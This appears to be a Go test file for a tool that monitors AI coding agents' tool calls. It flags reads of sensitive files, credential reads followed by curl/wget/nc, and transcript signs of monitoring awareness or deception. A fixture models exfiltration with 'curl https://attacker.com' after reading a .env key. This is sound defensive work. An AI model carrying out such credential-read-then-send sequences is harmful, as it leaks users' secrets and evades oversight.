package trace

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/ihavespoons/hooksy/internal/config"
	"github.com/ihavespoons/hooksy/internal/hooks"
)

func setupTestAnalyzer(t *testing.T, rules []config.SequenceRule) (*Analyzer, *SQLiteStore, func()) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "test.db")

	store, err := NewSQLiteStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}

	analyzer := NewAnalyzer(store, rules, config.DefaultTranscriptAnalysisSettings())

	return analyzer, store, func() {
		_ = store.Close()
	}
}

func TestAnalyzerNoRules(t *testing.T) {
	analyzer, _, cleanup := setupTestAnalyzer(t, nil)
	defer cleanup()

	event := &Event{
		SessionID: "test-session",
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze("test-session", event)
	if output != nil {
		t.Error("Expected nil output when no rules configured")
	}
}

func TestAnalyzerCountPattern(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:        "sensitive-file-access",
			Description: "Multiple sensitive file accesses",
			Enabled:     true,
			Severity:    "warning",
			Window:      "5m",
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PreToolUse,
					ToolName:  "^Read$",
					ToolInput: map[string]string{
						"file_path": "/(etc|root|\\.ssh|\\.aws)",
					},
					Count: ">=3",
				},
			},
			Decision: "ask",
			Message:  "Multiple sensitive file accesses detected",
		},
	}

	analyzer, store, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	sessionID := "test-session"
	_, err := store.GetOrCreateSession(sessionID, "/home/user", "")
	if err != nil {
		t.Fatalf("Failed to create session: %v", err)
	}

	// Store 2 events (below threshold)
	for i := 0; i < 2; i++ {
		event := &Event{
			SessionID: sessionID,
			EventType: hooks.PreToolUse,
			ToolName:  "Read",
			ToolInput: map[string]any{
				"file_path": "/etc/passwd",
			},
			Timestamp: time.Now().Add(time.Duration(-i) * time.Minute),
		}
		if err := store.StoreEvent(event); err != nil {
			t.Fatalf("Failed to store event: %v", err)
		}
	}

	// Third event should trigger the pattern
	currentEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Read",
		ToolInput: map[string]any{
			"file_path": "/etc/shadow",
		},
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze(sessionID, currentEvent)
	if output == nil {
		t.Fatal("Expected pattern to match with 3 events")
	}

	if output.HookSpecificOutput == nil || output.HookSpecificOutput.PermissionDecision != hooks.PermissionAsk {
		t.Error("Expected 'ask' decision")
	}
}

func TestAnalyzerSequencePattern(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:        "credential-then-network",
			Description: "Reading credentials followed by network request",
			Enabled:     true,
			Severity:    "critical",
			Window:      "5m",
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PostToolUse,
					ToolName:  "^Read$",
					ToolInput: map[string]string{
						"file_path": "\\.env$",
					},
					Label: "credential_read",
				},
				{
					EventType: hooks.PreToolUse,
					ToolName:  "^Bash$",
					ToolInput: map[string]string{
						"command": "(curl|wget|nc)",
					},
					After: "credential_read",
				},
			},
			Decision: "deny",
			Message:  "Network request after reading credentials",
		},
	}

	analyzer, store, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	sessionID := "test-session"
	_, err := store.GetOrCreateSession(sessionID, "/home/user", "")
	if err != nil {
		t.Fatalf("Failed to create session: %v", err)
	}

	// Store credential read event
	credEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PostToolUse,
		ToolName:  "Read",
		ToolInput: map[string]any{
			"file_path": "/app/.env",
		},
		ToolResponse: map[string]any{
			"content": "API_KEY=secret123",
		},
		Timestamp: time.Now().Add(-1 * time.Minute),
	}
	if err := store.StoreEvent(credEvent); err != nil {
		t.Fatalf("Failed to store credential event: %v", err)
	}

	// Network request should trigger the sequence
	networkEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		ToolInput: map[string]any{
			"command": "curl https://attacker.com",
		},
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze(sessionID, networkEvent)
	if output == nil {
		t.Fatal("Expected sequence pattern to match")
	}

	if output.HookSpecificOutput == nil || output.HookSpecificOutput.PermissionDecision != hooks.PermissionDeny {
		t.Error("Expected 'deny' decision")
	}
}

func TestAnalyzerSequencePatternNotTriggered(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:    "credential-then-network",
			Enabled: true,
			Window:  "5m",
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PostToolUse,
					ToolName:  "^Read$",
					ToolInput: map[string]string{
						"file_path": "\\.env$",
					},
					Label: "credential_read",
				},
				{
					EventType: hooks.PreToolUse,
					ToolName:  "^Bash$",
					ToolInput: map[string]string{
						"command": "(curl|wget)",
					},
					After: "credential_read",
				},
			},
			Decision: "deny",
		},
	}

	analyzer, store, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	sessionID := "test-session"
	_, err := store.GetOrCreateSession(sessionID, "/home/user", "")
	if err != nil {
		t.Fatalf("Failed to create session: %v", err)
	}

	// Only network request without credential read - should not trigger
	networkEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		ToolInput: map[string]any{
			"command": "curl https://example.com",
		},
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze(sessionID, networkEvent)
	if output != nil {
		t.Error("Expected no match without credential read event")
	}
}

func TestAnalyzerWindowExpiry(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:    "recent-access",
			Enabled: true,
			Window:  "1m", // Very short window
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PreToolUse,
					ToolName:  "^Read$",
					Count:     ">=2",
				},
			},
			Decision: "ask",
		},
	}

	analyzer, store, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	sessionID := "test-session"
	_, err := store.GetOrCreateSession(sessionID, "/home/user", "")
	if err != nil {
		t.Fatalf("Failed to create session: %v", err)
	}

	// Store an old event (outside window)
	oldEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Read",
		ToolInput: map[string]any{
			"file_path": "/etc/passwd",
		},
		Timestamp: time.Now().Add(-5 * time.Minute), // Outside 1m window
	}
	if err := store.StoreEvent(oldEvent); err != nil {
		t.Fatalf("Failed to store event: %v", err)
	}

	// Current event alone should not trigger (only 1 event in window)
	currentEvent := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Read",
		ToolInput: map[string]any{
			"file_path": "/etc/hosts",
		},
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze(sessionID, currentEvent)
	if output != nil {
		t.Error("Expected no match - old event should be outside window")
	}
}

func TestAnalyzerDisabledRule(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:    "disabled-rule",
			Enabled: false, // Disabled
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PreToolUse,
					ToolName:  ".*",
					Count:     ">=1",
				},
			},
			Decision: "deny",
		},
	}

	analyzer, _, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	event := &Event{
		SessionID: "test-session",
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze("test-session", event)
	if output != nil {
		t.Error("Expected nil - disabled rule should not match")
	}
}

func TestAnalyzerBlockDecision(t *testing.T) {
	rules := []config.SequenceRule{
		{
			Name:    "block-test",
			Enabled: true,
			Events: []config.SequenceEvent{
				{
					EventType: hooks.PreToolUse,
					ToolName:  "^Dangerous$",
				},
			},
			Decision: "block",
			Message:  "Dangerous tool blocked",
		},
	}

	analyzer, store, cleanup := setupTestAnalyzer(t, rules)
	defer cleanup()

	sessionID := "test-session"
	_, _ = store.GetOrCreateSession(sessionID, "/home/user", "")

	event := &Event{
		SessionID: sessionID,
		EventType: hooks.PreToolUse,
		ToolName:  "Dangerous",
		Timestamp: time.Now(),
	}

	output := analyzer.Analyze(sessionID, event)
	if output == nil {
		t.Fatal("Expected pattern to match")
	}

	if output.Continue != false {
		t.Error("Expected Continue=false for block decision")
	}
}

func TestParseCount(t *testing.T) {
	tests := []struct {
		expr     string
		wantNum  int
		wantOp   string
	}{
		{">=3", 3, ">="},
		{">5", 5, ">"},
		{"<=10", 10, "<="},
		{"<2", 2, "<"},
		{"==1", 1, "=="},
		{"=4", 4, "="},
		{"3", 3, ">="}, // Just a number defaults to >=
	}

	for _, tt := range tests {
		num, op := parseCount(tt.expr)
		if num != tt.wantNum || op != tt.wantOp {
			t.Errorf("parseCount(%q) = (%d, %q), want (%d, %q)",
				tt.expr, num, op, tt.wantNum, tt.wantOp)
		}
	}
}

func TestEventMatches(t *testing.T) {
	analyzer := &Analyzer{}

	tests := []struct {
		name    string
		event   *Event
		spec    *config.SequenceEvent
		want    bool
	}{
		{
			name: "matches event type and tool",
			event: &Event{
				EventType: hooks.PreToolUse,
				ToolName:  "Bash",
			},
			spec: &config.SequenceEvent{
				EventType: hooks.PreToolUse,
				ToolName:  "^Bash$",
			},
			want: true,
		},
		{
			name: "wrong event type",
			event: &Event{
				EventType: hooks.PostToolUse,
				ToolName:  "Bash",
			},
			spec: &config.SequenceEvent{
				EventType: hooks.PreToolUse,
				ToolName:  "^Bash$",
			},
			want: false,
		},
		{
			name: "tool name regex",
			event: &Event{
				EventType: hooks.PreToolUse,
				ToolName:  "Read",
			},
			spec: &config.SequenceEvent{
				EventType: hooks.PreToolUse,
				ToolName:  "^(Read|Write)$",
			},
			want: true,
		},
		{
			name: "tool input match",
			event: &Event{
				EventType: hooks.PreToolUse,
				ToolName:  "Read",
				ToolInput: map[string]any{
					"file_path": "/home/user/.ssh/id_rsa",
				},
			},
			spec: &config.SequenceEvent{
				EventType: hooks.PreToolUse,
				ToolName:  "^Read$",
				ToolInput: map[string]string{
					"file_path": "\\.ssh",
				},
			},
			want: true,
		},
		{
			name: "tool input no match",
			event: &Event{
				EventType: hooks.PreToolUse,
				ToolName:  "Read",
				ToolInput: map[string]any{
					"file_path": "/home/user/readme.txt",
				},
			},
			spec: &config.SequenceEvent{
				EventType: hooks.PreToolUse,
				ToolInput: map[string]string{
					"file_path": "\\.ssh",
				},
			},
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := analyzer.eventMatches(tt.event, tt.spec)
			if got != tt.want {
				t.Errorf("eventMatches() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestNewAnalyzer_TranscriptDisabled(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "test.db")

	store, err := NewSQLiteStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}
	defer func() { _ = store.Close() }()

	settings := config.TranscriptAnalysisSettings{
		Enabled:       false,
		RiskThreshold: 0.3,
	}
	analyzer := NewAnalyzer(store, nil, settings)

	if analyzer.transcriptAnalyzer != nil {
		t.Error("transcriptAnalyzer should be nil when disabled")
	}
}

func TestNewAnalyzer_TranscriptEnabled(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "test.db")

	store, err := NewSQLiteStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}
	defer func() { _ = store.Close() }()

	settings := config.TranscriptAnalysisSettings{
		Enabled:       true,
		RiskThreshold: 0.5,
	}
	analyzer := NewAnalyzer(store, nil, settings)

	if analyzer.transcriptAnalyzer == nil {
		t.Error("transcriptAnalyzer should not be nil when enabled")
	}
	if analyzer.transcriptAnalysisSettings.RiskThreshold != 0.5 {
		t.Errorf("RiskThreshold should be 0.5, got %f", analyzer.transcriptAnalysisSettings.RiskThreshold)
	}
}

func TestTranscriptAnalysisToOutput_RiskThreshold(t *testing.T) {
	settings := config.TranscriptAnalysisSettings{
		Enabled:       true,
		RiskThreshold: 0.5,
	}
	analyzer := &Analyzer{
		transcriptAnalysisSettings: settings,
	}

	tests := []struct {
		name       string
		riskScore  float64
		wantNil    bool
		wantDecision string
	}{
		{
			name:      "below threshold returns nil",
			riskScore: 0.4,
			wantNil:   true,
		},
		{
			name:         "at threshold returns ask",
			riskScore:    0.5,
			wantNil:      false,
			wantDecision: "ask",
		},
		{
			name:         "between ask and deny returns ask",
			riskScore:    0.7,
			wantNil:      false,
			wantDecision: "ask",
		},
		{
			name:         "above deny threshold returns deny",
			riskScore:    0.85,
			wantNil:      false,
			wantDecision: "deny",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis := &TranscriptAnalysis{
				RiskScore:           tt.riskScore,
				MonitoringAwareness: []Indicator{{}}, // need at least one for reason building
			}
			output := analyzer.transcriptAnalysisToOutput(analysis, hooks.PreToolUse)

			if tt.wantNil {
				if output != nil {
					t.Errorf("expected nil output for risk score %.2f", tt.riskScore)
				}
				return
			}

			if output == nil {
				t.Fatalf("expected non-nil output for risk score %.2f", tt.riskScore)
			}

			switch tt.wantDecision {
			case "deny":
				if output.HookSpecificOutput == nil || output.HookSpecificOutput.PermissionDecision != hooks.PermissionDeny {
					t.Errorf("expected deny decision for risk score %.2f", tt.riskScore)
				}
			case "ask":
				if output.HookSpecificOutput == nil || output.HookSpecificOutput.PermissionDecision != hooks.PermissionAsk {
					t.Errorf("expected ask decision for risk score %.2f", tt.riskScore)
				}
			}
		})
	}
}

func TestTranscriptAnalysisToOutput_DefaultThreshold(t *testing.T) {
	// When RiskThreshold is 0 (zero value), should fall back to 0.3
	settings := config.TranscriptAnalysisSettings{
		Enabled:       true,
		RiskThreshold: 0,
	}
	analyzer := &Analyzer{
		transcriptAnalysisSettings: settings,
	}

	// 0.25 should be below the fallback threshold of 0.3
	analysis := &TranscriptAnalysis{
		RiskScore:           0.25,
		MonitoringAwareness: []Indicator{{}},
	}
	output := analyzer.transcriptAnalysisToOutput(analysis, hooks.PreToolUse)
	if output != nil {
		t.Error("expected nil output for risk score 0.25 with default threshold 0.3")
	}

	// 0.35 should trigger ask with default threshold 0.3
	analysis.RiskScore = 0.35
	output = analyzer.transcriptAnalysisToOutput(analysis, hooks.PreToolUse)
	if output == nil {
		t.Error("expected non-nil output for risk score 0.35 with default threshold 0.3")
	}
}

func TestTranscriptAnalysisToOutput_HighThresholdDenyCap(t *testing.T) {
	// With threshold 0.7, deny threshold would be 1.0 but is capped at 0.9
	settings := config.TranscriptAnalysisSettings{
		Enabled:       true,
		RiskThreshold: 0.7,
	}
	analyzer := &Analyzer{
		transcriptAnalysisSettings: settings,
	}

	// 0.95 should trigger deny (above 0.9 cap)
	analysis := &TranscriptAnalysis{
		RiskScore:          0.95,
		DeceptionIndicators: []Indicator{{}},
	}
	output := analyzer.transcriptAnalysisToOutput(analysis, hooks.PreToolUse)
	if output == nil {
		t.Fatal("expected non-nil output")
	}
	if output.HookSpecificOutput.PermissionDecision != hooks.PermissionDeny {
		t.Error("expected deny for risk score 0.95 with capped deny threshold 0.9")
	}

	// 0.85 should trigger ask (between 0.7 and 0.9)
	analysis.RiskScore = 0.85
	output = analyzer.transcriptAnalysisToOutput(analysis, hooks.PreToolUse)
	if output == nil {
		t.Fatal("expected non-nil output")
	}
	if output.HookSpecificOutput.PermissionDecision != hooks.PermissionAsk {
		t.Error("expected ask for risk score 0.85 with threshold 0.7")
	}
}

func TestAnalyzeWithTranscript_DisabledTranscript(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "test.db")

	store, err := NewSQLiteStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}
	defer func() { _ = store.Close() }()

	settings := config.TranscriptAnalysisSettings{
		Enabled:       false,
		RiskThreshold: 0.3,
	}
	analyzer := NewAnalyzer(store, nil, settings)

	event := &Event{
		SessionID: "test-session",
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		Timestamp: time.Now(),
	}

	// Should return nil since transcript analysis is disabled
	output := analyzer.AnalyzeWithTranscript("test-session", "/some/transcript.jsonl", event)
	if output != nil {
		t.Error("expected nil output when transcript analysis is disabled")
	}
}

func TestMostRestrictive(t *testing.T) {
	analyzer := &Analyzer{}

	tests := []struct {
		name     string
		a1       *hooks.HookOutput
		a2       *hooks.HookOutput
		wantNil  bool
		wantPerm hooks.PermissionDecision
		wantCont bool
	}{
		{
			name:    "both nil returns nil",
			a1:      nil,
			a2:      nil,
			wantNil: true,
		},
		{
			name:     "first nil returns second",
			a1:       nil,
			a2:       hooks.NewAllowOutput(hooks.PreToolUse, "ok"),
			wantPerm: hooks.PermissionAllow,
			wantCont: true,
		},
		{
			name:     "second nil returns first",
			a1:       hooks.NewDenyOutput(hooks.PreToolUse, "denied"),
			a2:       nil,
			wantPerm: hooks.PermissionDeny,
			wantCont: true,
		},
		{
			name:     "deny beats allow",
			a1:       hooks.NewAllowOutput(hooks.PreToolUse, "ok"),
			a2:       hooks.NewDenyOutput(hooks.PreToolUse, "denied"),
			wantPerm: hooks.PermissionDeny,
			wantCont: true,
		},
		{
			name:     "ask beats allow",
			a1:       hooks.NewAskOutput(hooks.PreToolUse, "ask"),
			a2:       hooks.NewAllowOutput(hooks.PreToolUse, "ok"),
			wantPerm: hooks.PermissionAsk,
			wantCont: true,
		},
		{
			name:     "deny beats ask",
			a1:       hooks.NewAskOutput(hooks.PreToolUse, "ask"),
			a2:       hooks.NewDenyOutput(hooks.PreToolUse, "denied"),
			wantPerm: hooks.PermissionDeny,
			wantCont: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := analyzer.mostRestrictive(tt.a1, tt.a2, hooks.PreToolUse)
			if tt.wantNil {
				if result != nil {
					t.Error("expected nil result")
				}
				return
			}
			if result == nil {
				t.Fatal("expected non-nil result")
			}
			if result.Continue != tt.wantCont {
				t.Errorf("expected Continue=%v, got %v", tt.wantCont, result.Continue)
			}
			if result.HookSpecificOutput != nil && result.HookSpecificOutput.PermissionDecision != tt.wantPerm {
				t.Errorf("expected permission=%v, got %v", tt.wantPerm, result.HookSpecificOutput.PermissionDecision)
			}
		})
	}
}

func TestMostRestrictive_BlockBeatsAll(t *testing.T) {
	analyzer := &Analyzer{}

	blockOutput := &hooks.HookOutput{
		Continue:    false,
		StopReason:  "blocked",
	}
	denyOutput := hooks.NewDenyOutput(hooks.PreToolUse, "denied")

	result := analyzer.mostRestrictive(denyOutput, blockOutput, hooks.PreToolUse)
	if result.Continue != false {
		t.Error("block should beat deny")
	}
}

func TestToString(t *testing.T) {
	tests := []struct {
		name  string
		input any
		want  string
	}{
		{"string value", "hello", "hello"},
		{"bytes value", []byte("world"), "world"},
		{"int value", 42, ""},
		{"nil value", nil, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := toString(tt.input)
			if got != tt.want {
				t.Errorf("toString(%v) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestGetTranscriptAnalysis(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "test.db")

	store, err := NewSQLiteStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}
	defer func() { _ = store.Close() }()

	settings := config.TranscriptAnalysisSettings{
		Enabled:       true,
		RiskThreshold: 0.3,
	}
	analyzer := NewAnalyzer(store, nil, settings)

	// Non-existent file should return error
	_, err = analyzer.GetTranscriptAnalysis("/nonexistent/transcript.jsonl")
	if err == nil {
		t.Error("expected error for non-existent transcript file")
	}
}

func TestCheckTranscript_WithRealTranscript(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "test.db")

	store, err := NewSQLiteStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}
	defer func() { _ = store.Close() }()

	// Create a clean transcript file
	transcriptPath := filepath.Join(tmpDir, "clean_transcript.jsonl")
	content := `{"type":"user","role":"user","content":[{"type":"text","text":"Please list files"}]}
{"type":"assistant","message":{"role":"assistant","content":[{"type":"text","text":"Here are the files."}]}}
`
	if err := writeTestFile(transcriptPath, content); err != nil {
		t.Fatalf("Failed to write transcript: %v", err)
	}

	settings := config.TranscriptAnalysisSettings{
		Enabled:       true,
		RiskThreshold: 0.3,
	}
	analyzer := NewAnalyzer(store, nil, settings)

	// Clean transcript should return nil (below threshold)
	output := analyzer.checkTranscript("test-session", transcriptPath, hooks.PreToolUse)
	if output != nil {
		t.Errorf("expected nil output for clean transcript, got decision=%v",
			output.HookSpecificOutput.PermissionDecision)
	}
}

func TestCheckTranscript_CachesResult(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "test.db")

	store, err := NewSQLiteStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}
	defer func() { _ = store.Close() }()

	transcriptPath := filepath.Join(tmpDir, "transcript.jsonl")
	content := `{"type":"user","role":"user","content":[{"type":"text","text":"Hello"}]}
`
	if err := writeTestFile(transcriptPath, content); err != nil {
		t.Fatalf("Failed to write transcript: %v", err)
	}

	settings := config.TranscriptAnalysisSettings{
		Enabled:       true,
		RiskThreshold: 0.3,
	}
	analyzer := NewAnalyzer(store, nil, settings)

	// First call
	analyzer.checkTranscript("session1", transcriptPath, hooks.PreToolUse)

	// Second call should use cache (verify by checking cache entry exists)
	cacheKey := "session1:" + transcriptPath
	_, ok := analyzer.transcriptCache.Load(cacheKey)
	if !ok {
		t.Error("expected transcript analysis to be cached after first call")
	}
}

func TestCheckTranscript_NonexistentFile(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "test.db")

	store, err := NewSQLiteStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}
	defer func() { _ = store.Close() }()

	settings := config.TranscriptAnalysisSettings{
		Enabled:       true,
		RiskThreshold: 0.3,
	}
	analyzer := NewAnalyzer(store, nil, settings)

	// Non-existent file should return nil (graceful failure)
	output := analyzer.checkTranscript("session1", "/nonexistent/transcript.jsonl", hooks.PreToolUse)
	if output != nil {
		t.Error("expected nil output for non-existent transcript file")
	}
}

func writeTestFile(path, content string) error {
	return os.WriteFile(path, []byte(content), 0644)
}
